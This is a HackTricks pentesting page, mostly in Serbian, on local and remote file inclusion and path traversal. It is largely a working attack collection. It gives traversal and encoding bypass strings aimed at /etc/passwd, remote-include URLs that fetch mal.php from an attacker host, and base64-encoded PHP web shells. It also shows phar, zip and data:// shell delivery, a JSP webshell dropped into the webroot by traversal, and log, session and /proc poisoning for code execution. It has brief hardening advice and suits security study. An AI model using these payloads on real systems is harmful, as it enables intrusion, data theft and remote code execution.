# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Datoteka se učitava sa udaljenog servera (Najbolje: možete napisati kod i server će ga izvršiti). U php-u je ovo **onemogućeno** po defaultu (**allow_url_include**).\
**Local File Inclusion (LFI):** Server učitava lokalnu datoteku.

Ranjivost nastaje kada korisnik na neki način može kontrolisati koju će datoteku server učitati.

Ranljive **PHP functions**: require, require_once, include, include_once

Zanimljiv alat za eksploataciju ove ranjivosti: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Kombinovanjem nekoliko \*nix LFI listi i dodavanjem još putanja napravio sam ovu:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Pokušajte takođe da zamenite `/` sa `\`\
Pokušajte takođe da dodate `../../../../../`

Lista koja koristi nekoliko tehnika da pronađe fajl /etc/password (da proveri da li ranjivost postoji) može se naći [ovde](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Spoj različitih wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Pokušajte takođe da zamenite `/` sa `\`\
Pokušajte takođe da uklonite `C:/` i dodate `../../../../../`

Lista koja koristi nekoliko tehnika da pronađe fajl /boot.ini (da proveri da li ranjivost postoji) može se naći [ovde](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Proverite LFI listu za Linux.

## Osnovni LFI i bypasses

Svi primeri su za Local File Inclusion ali se mogu primeniti i na Remote File Inclusion takođe (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences uklonjene bez rekurzije
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass dodavanja dodatnih karaktera na kraj prosleđenog stringa (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Ovo je **rešeno od PHP 5.4**

### **Kodiranje**

Možete koristiti nestandardna kodiranja kao što su double URL encode (i druga):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Iz postojeće fascikle

Možda back-end proverava putanju foldera:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Istraživanje direktorijuma datotečnog sistema na serveru

Datotečni sistem servera može se rekurzivno istražiti kako bi se identifikovali direktorijumi, ne samo fajlovi, primenom određenih tehnika. Ovaj proces uključuje utvrđivanje dubine direktorijuma i ispitivanje postojanja određenih foldera. Ispod je detaljna metoda za to:

1. **Utvrdi dubinu direktorijuma:** Odredite dubinu svog trenutnog direktorijuma uspešnim dohvatom fajla `/etc/passwd` (važi ako je server zasnovan na Linuxu). Primer URL-a može biti strukturiran na sledeći način, što ukazuje na dubinu od tri:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Ispitajte direktorijume:** Dodajte ime sumnjivog direktorijuma (npr. `private`) na URL, zatim se vratite na `/etc/passwd`. Dodatni nivo direktorijuma zahteva povećanje dubine za jedan:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Tumačenje rezultata:** Serverov odgovor ukazuje da li direktorijum postoji:
- **Greška / Nema izlaza:** Direktorijum `private` verovatno ne postoji na naznačenoj lokaciji.
- **Sadržaj `/etc/passwd`:** Prisutnost direktorijuma `private` je potvrđena.
4. **Rekurzivno istraživanje:** Otkrivene direktorijume je moguće dodatno ispitivati za poddirektorijume ili fajlove koristeći istu tehniku ili tradicionalne Local File Inclusion (LFI) metode.

Za istraživanje direktorijuma na različitim lokacijama u fajl sistemu, prilagodite payload u skladu s tim. Na primer, da proverite da li `/var/www/` sadrži direktorijum `private` (pretpostavljajući da je trenutni direktorijum na dubini od 3), koristite:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation je metoda koja se koristi za manipulaciju file paths u web aplikacijama. Često se koristi za pristup zaštićenim fajlovima tako što zaobilazi određene sigurnosne mere koje dodaju dodatne karaktere na kraj putanja do fajlova. Cilj je konstruisati putanju koja, nakon što je izmenjena od strane sigurnosne mere, i dalje pokazuje na željeni fajl.

U PHP, različite reprezentacije putanje do fajla mogu se smatrati ekvivalentnim zbog prirode fajl sistema. Na primer:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` are all treated as the same path.
- When the last 6 characters are `passwd`, appending a `/` (making it `passwd/`) doesn't change the targeted file.
- Similarly, if `.php` is appended to a file path (like `shellcode.php`), adding a `/.` at the end will not alter the file being accessed.

Primeri koji slede pokazuju kako iskoristiti path truncation da se pristupi `/etc/passwd`, česta meta zbog osetljivog sadržaja (informacije o korisničkim nalozima):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
U ovim scenarijima, broj potrebnih traversala može biti oko 2027, ali taj broj može varirati u zavisnosti od konfiguracije servera.

- **Using Dot Segments and Additional Characters**: Traversal sequences (`../`) u kombinaciji sa dodatnim tačkastim segmentima i karakterima mogu se koristiti za navigaciju fajl sistemom, efektivno ignorišući dodate stringove koje server prikači.
- **Determining the Required Number of Traversals**: Metodom pokušaja i grešaka može se pronaći tačan broj `../` sekvenci potrebnih da se dođe do root direktorijuma, a zatim do `/etc/passwd`, pri čemu se obezbeđuje da su dodati stringovi (npr. `.php`) neutralisani, a željeni put (`/etc/passwd`) ostane netaknut.
- **Starting with a Fake Directory**: Uobičajena praksa je započeti put nepostojećim direktorijumom (npr. `a/`). Ova tehnika se koristi kao mera predostrožnosti ili da bi se ispunili zahtevi logike parsiranja putanja na serveru.

Primenjujući tehnike skraćivanja putanja, ključno je razumeti ponašanje servera pri parsiranju putanja i strukturu fajl sistema. Svaki scenarij može zahtevati drugačiji pristup, pa su testiranja često neophodna da se pronađe najučinkovitija metoda.

**Ova ranjivost je ispravljena u PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

U php-u je ovo po defaultu onemogućeno zato što je **`allow_url_include`** **Off.** Mora biti **On** da bi radilo, i u tom slučaju možete uključiti PHP fajl sa vašeg servera i dobiti RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Ako iz nekog razloga **`allow_url_include`** je **On**, ali PHP filtrira pristup spoljnim web-stranicama, [prema ovom postu](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), možete, na primer, koristiti data protokol sa base64 da dekodirate b64 PHP kod i dobijete RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> U prethodnom кодu, završni `+.txt` је dodat јер је нападачу био потребан string који се završава са `.txt`, па се низ завршава њиме и након b64 decode-а тај део ће вратити само смеће, а стварни PHP код биће укључен (и самим тим, извршен).

Another example **not using the `php://` protocol** would be:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python korenski element

U Pythonu, u kodu poput ovog:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Ako korisnik prosledi **absolute path** kao **`file_name`**, **prethodni path se jednostavno uklanja**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Ovo je očekivano ponašanje prema [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Ako je komponenta apsolutna putanja, sve prethodne komponente se odbacuju i spajanje se nastavlja od apsolutne komponente puta.

## Java Prikaz sadržaja direktorijuma

Izgleda da, ako imate Path Traversal u Java i **zatražite direktorijum** umesto fajla, **vraća se prikaz sadržaja direktorijuma**. Ovo se neće dešavati u drugim jezicima (koliko ja znam).

## Top 25 parametara

Evo liste 25 parametara koji bi mogli biti ranjivi na local file inclusion (LFI) (iz [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI using PHP wrappers & protocols

### php://filter

PHP filters omogućavaju izvođenje osnovnih **operacija modifikacije nad podacima** pre nego što se oni pročitaju ili zapisuju. Postoji 5 kategorija filtera:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Uklanja tagove iz podataka (sve između znakova "<" i ">")
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Transformiše u drugo enkodiranje(`convert.iconv.<input_enc>.<output_enc>`). Da biste dobili **listu svih enkodiranja** koja su podržana, pokrenite u konzoli: `iconv -l`

> [!WARNING]
> Zloupotrebom `convert.iconv.*` konverzionog filtera možete **generisati proizvoljan tekst**, što može biti korisno za upis proizvoljnog teksta ili da naterate funkciju kao include da obradi proizvoljan tekst. Za više informacija pogledajte [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Kompresuje sadržaj (korisno ako ekstrafluirate mnogo informacija)
- `zlib.inflate`: Dekomprimiše podatke
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Deprecated
- `mdecrypt.*` : Deprecated
- Ostali filteri
- Pokretanjem u php `var_dump(stream_get_filters());` možete pronaći par **neočekivanih filtera**:
- `consumed`
- `dechunk`: poništava HTTP chunked encoding
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Deo "php://filter" nije osetljiv na velika/mala slova

### Korišćenje php filters kao oracle za čitanje proizvoljnih fajlova

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) predlaže tehniku za čitanje lokalnog fajla bez vraćanja sadržaja od servera. Tehnika se zasniva na **boolean exfiltration of the file (char by char) using php filters** kao oracle. To je zato što se php filters mogu iskoristiti da tekst postane dovoljno veliki da php baci izuzetak.

U originalnom postu možete naći detaljno objašnjenje tehnike, ali ovde je kratak rezime:

- Koristite codec **`UCS-4LE`** da ostavite vodeći karakter teksta na početku i učinite da se veličina stringa eksponencijalno poraste.
- Ovo će se koristiti da se generiše **text so big when the initial letter is guessed correctly** da php pokrene **error**.
- Filter **dechunk** će **remove everything if the first char is not an hexadecimal**, pa možemo znati da li je prvi karakter hex.
- Ovo, u kombinaciji sa prethodnim (i drugim filterima u zavisnosti od pogađanog slova), će nam omogućiti da pogodimo slovo na početku teksta tako što ćemo videti kada uradimo dovoljno transformacija da ono prestane biti heksadecimalni karakter. Jer ako je hex, dechunk ga neće obrisati i inicijalna bomba će izazvati php error.
- Codec **convert.iconv.UNICODE.CP930** transformiše svako slovo u sledeće (tako da posle ovog codec-a: a -> b). Ovo nam omogućava da otkrijemo da li je prvi karakter na primer `a` jer ako primenimo 6 puta ovaj codec a->b->c->d->e->f->g, slovo više nije heksadecimalni karakter, te dechunk ga neće obrisati i php error će biti pokrenut zato što se množi sa inicijalnom bombom.
- Korišćenjem drugih transformacija kao što je **rot13** na početku moguće je leak-ovati druga slova kao n, o, p, q, r (i drugi codecs se mogu koristiti da pomere druga slova u hex opseg).
- Kada je početni karakter broj, potrebno ga je base64 encode-ovati i leak-ovati prva 2 slova da bi se otkrio broj.
- Krajnji problem je videti **how to leak more than the initial letter**. Korišćenjem order memory filtera kao što su **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** moguće je promeniti redosled karaktera i dovesti u prvu poziciju druga slova iz teksta.
- I da bi se omogućilo dobijanje **further data** ideja je da se **generate 2 bytes of junk data at the beginning** sa **convert.iconv.UTF16.UTF16**, primeni **UCS-4LE** da se ono **pivot with the next 2 bytes**, i d**elete the data until the junk data** (ovo će ukloniti prva 2 bajta inicijalnog teksta). Nastaviti dok ne stignete do željenog bita za leak.

U postu je takođe objavljen alat za automatsko izvođenje: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Ovaj wrapper omogućava pristup file descriptors koje proces ima otvorene. Potencijalno korisno za exfiltrate sadržaj otvorenih fajlova:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Takođe možete koristiti **php://stdin, php://stdout and php://stderr** da pristupite **file descriptors 0, 1 and 2** redom (nisam siguran kako bi ovo moglo biti korisno u napadu)

### zip:// and rar://

Otpremite Zip ili Rar fajl koji sadrži PHPShell i pristupite mu.\
Da biste mogli zloupotrebiti rar protocol on **mora biti posebno aktiviran**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Imajte na umu da je ovaj protokol ograničen php konfiguracijama **`allow_url_open`** i **`allow_url_include`**

### expect://

Expect mora biti aktiviran. Možete izvršavati kod koristeći ovo:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Navedite svoj payload u POST parametrima:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

`.phar` fajl se može iskoristiti za izvršavanje PHP koda kada web aplikacija koristi funkcije kao što je `include` za učitavanje fajlova. PHP kod ispod prikazuje kreiranje `.phar` fajla:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Da biste kompajlirali `.phar` fajl, izvršite sledeću komandu:
```bash
php --define phar.readonly=0 create_path.php
```
Po izvršenju, biće kreirana datoteka nazvana `test.phar`, koja se potencijalno može iskoristiti za eksploatisanje Local File Inclusion (LFI) ranjivosti.

U slučajevima kada LFI samo čita fajl bez izvršavanja PHP koda unutar njega, kroz funkcije kao što su `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, ili `filesize()`, moguće je pokušati eksploatisanje deserialization ranjivosti. Ova ranjivost je povezana sa čitanjem fajlova korišćenjem `phar` protokola.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Bio je moguć zloupotreba **any arbitrary file read from PHP that supports php filters** da se dobije RCE. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Vrlo kratak rezime: a **3 byte overflow** u PHP heap-u je zloupotrebljen da bi se izmenio lanac slobodnih chunk-ova određene veličine kako bi se moglo **write anything in any address**, pa je dodat hook koji poziva **`system`**.\
Bilo je moguće alocirati chunk-ove specifičnih veličina zloupotrebljavajući više php filtera.

### More protocols

Check more possible[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Upis u memoriju ili u privremeni fajl (nije sigurno kako ovo može biti korisno u file inclusion napadu)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Pristup lokalnom fajl sistemu
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Pristup HTTP(s) URL-ovima
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Pristup FTP URL-ovima
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Kompresioni tokovi
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Pronalazi putanje koje odgovaraju šablonu (ne vraća ništa ispisivo, tako da nije naročito korisno ovde)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio tokovi (nije korisno za čitanje proizvoljnih fajlova)

## LFI via PHP's 'assert'

Rizik od Local File Inclusion (LFI) u PHP-u je naročito visok kada je u pitanju funkcija 'assert', koja može izvršavati kod unutar stringova. To je posebno problematično ako se ulaz koji sadrži karaktere za directory traversal kao što su ".." proverava ali nije pravilno sanitizovan.

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Iako je ovo namenjeno da zaustavi traversal, to nehotice stvara vektor za code injection. Da bi iskoristio ovo za čitanje sadržaja fajla, napadač bi mogao koristiti:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Slično tome, za izvršavanje proizvoljnih sistemskih komandi, može se koristiti:
```plaintext
' and die(system("id")) or '
```
It's important to **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Ova tehnika je relevantna u slučajevima kada vi **kontrolišete** **putanju fajla** PHP funkcije koja će **pristupiti fajlu**, ali nećete videti sadržaj fajla (npr. jednostavan poziv **`file()`**) i sadržaj se ne prikazuje.

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) it's explained how a blind path traversal can be abused via PHP filter to **exfiltrate the content of a file via an error oracle**.

Kao rezime, tehnika koristi **"UCS-4LE" encoding** da sadržaj fajla učini toliko **velikim** da će **PHP funkcija koja otvara** fajl izazvati **error**.

Zatim, da bi se leak the first char koristi se filter **`dechunk`** zajedno sa drugim kao što su **base64** ili **rot13**, i na kraju se koriste filteri **convert.iconv.UCS-4.UCS-4LE** i **convert.iconv.UTF16.UTF-16BE** da postave druge chars na početak i leak.

**Funkcije koje mogu biti ranjive**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Za tehničke detalje pogledajte pomenuti post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Kada server-side kod koji prihvata/uploaduje fajlove gradi destinacionu putanju koristeći korisnički kontrolisane podatke (npr. filename ili URL) bez canonicalising i validacije, `..` segmenata i apsolutne putanje mogu pobeći iz nameravane direktorijumske strukture i prouzrokovati arbitrary file write. Ako možete postaviti payload u direktorijum eksponiran na webu, obično dobijate unauthenticated RCE tako što postavite webshell.

Tipični tok eksploatacije:
- Identifikujte write primitive u endpointu ili background workeru koji prihvata path/filename i upisuje sadržaj na disk (npr. message-driven ingestion, XML/JSON command handlers, ZIP extractors, itd.).
- Odredite direktorijume koji su izloženi webu. Uobičajeni primeri:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Napravite traversal path koji izlazi iz predviđenog storage direktorijuma u webroot, i uključite sadržaj vašeg webshell-a.
- Otvorite u browseru postavljeni payload i izvršavajte komande.

Napomene:
- Ranljiva usluga koja vrši zapis može slušati na non-HTTP portu (npr. JMF XML listener na TCP 4004). Glavni web portal (na drugom portu) će kasnije servirati vaš payload.
- Na Java stack-ovima, ovi file write-ovi su često implementirani prostom `File`/`Paths` konkatenacijom. Nedostatak canonicalisation/allow-listing je osnovni propust.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Hardening that defeats this class of bugs:
- Razrešite putanju do canonical path-a i osigurajte da je potomak allow-listed osnovnog direktorijuma.
- Odbacite svaku putanju koja sadrži `..`, apsolutne root-ove, ili slova drajva; preferirajte generated filenames.
- Pokrenite writer pod low-privileged nalogom i segregirajte write direktorijume od served roots.

## Remote File Inclusion

Objašnjeno ranije, [**pratite ovaj link**](#remote-file-inclusion).

### Korišćenjem Apache/Nginx log fajla

Ako je Apache ili Nginx server **ranjiv na LFI** unutar include funkcije možete pokušati da pristupite **`/var/log/apache2/access.log` ili `/var/log/nginx/access.log`**, postavite u **user agent** ili u **GET parameter** php shell kao **`<?php system($_GET['c']); ?>`** i include-ujete taj fajl

> [!WARNING]
> Imajte na umu da **ako koristite dvostruke navodnike** za shell umesto **jednostrukih navodnika**, dvostruki navodnici će biti izmenjeni za string "_**quote;**_", **PHP će baciti grešku** tamo i **ništa drugo neće biti izvršeno**.
>
> Takođe, pobrinite se da **ispravno napišete payload** ili će PHP prijavljivati grešku svaki put kad pokuša da učita log fajl i nećete imati drugu priliku.

Ovo se može uraditi i u drugim logovima ali **budite oprezni,** kod unutar logova može biti URL enkodiran i to može uništiti Shell. Header **authorisation "basic"** sadrži "user:password" u Base64 i on se dekodira unutar logova. PHPShell može biti ubacen u ovaj header.\
Ostale moguće putanje logova:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Preko Emaila

**Send a mail** na internu adresu (user@localhost) koja sadrži vaš PHP payload kao `<?php echo system($_REQUEST["cmd"]); ?>` i pokušajte da include-ujete mejl korisnika sa putanjom kao **`/var/mail/<USERNAME>`** ili **`/var/spool/mail/<USERNAME>`**

### Preko /proc/*/fd/*

1. Upload mnogo shells (na primer: 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), gde je $PID PID procesa (može se brute force-ovati) a $FD file descriptor (takođe se može brute force-ovati)

### Preko /proc/self/environ

Kao kod log fajla, pošaljite payload u User-Agent, biće reflektovan unutar fajla /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Putem uploada

Ako možete da upload-ujete fajl, samo ubacite shell payload u njega (npr: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Da bi fajl ostao čitljiv, najbolje je ubaciti u metapodatke slika/dokumenata/PDF

### Putem ZIP upload-a

Otpremite ZIP fajl koji sadrži kompresovani PHP shell i pristupite:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Kroz PHP sessions

Proverite da li sajt koristi PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
U PHP-u ove sesije se čuvaju u _/var/lib/php5/sess\\_\[PHPSESSID]\_ fajlovima
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Postavite cookie na `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Iskoristi LFI da uključiš PHP session fajl
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Preko ssh

Ako je ssh aktivan, proverite koji korisnik se koristi (/proc/self/status & /etc/passwd) i pokušajte da pristupite **\<HOME>/.ssh/id_rsa**

### **Preko** **vsftpd** _**logs**_

Logovi FTP servera vsftpd se nalaze u _**/var/log/vsftpd.log**_. U scenariju gde postoji Local File Inclusion (LFI) ranjivost, i pristup izloženom vsftpd serveru je moguć, sledeći koraci se mogu razmotriti:

1. Inject a PHP payload into the username field during the login process.
2. Post injection, utilize the LFI to retrieve the server logs from _**/var/log/vsftpd.log**_.

### Via php base64 filter (using base64)

Kao što je prikazano u [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article, PHP base64 filter just ignore Non-base64. Možete to iskoristiti da zaobiđete proveru ekstenzije fajla: ako pošaljete base64 koji se završava sa ".php", filter će jednostavno ignorisati "." i pripojiti "php" base64-u. Evo primera payload-a:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Preko php filters (nije potreban fajl)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)objašnjava da možete koristiti **php filters da generišete proizvoljan sadržaj** kao izlaz. Što u suštini znači da možete **generisati proizvoljan php code** za include **bez potrebe da ga upisujete** u fajl.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Preko segmentation fault

**Otpremite** fajl koji će biti sačuvan kao **temporary** u `/tmp`, zatim u **istom zahtevu,** izazovite **segmentation fault**, i tada **privremeni fajl se neće obrisati** i možete ga potražiti.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Preko Nginx temp file storage

If you found a **Local File Inclusion** and **Nginx** is running in front of PHP you might be able to obtain RCE with the following technique:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Preko PHP_SESSION_UPLOAD_PROGRESS

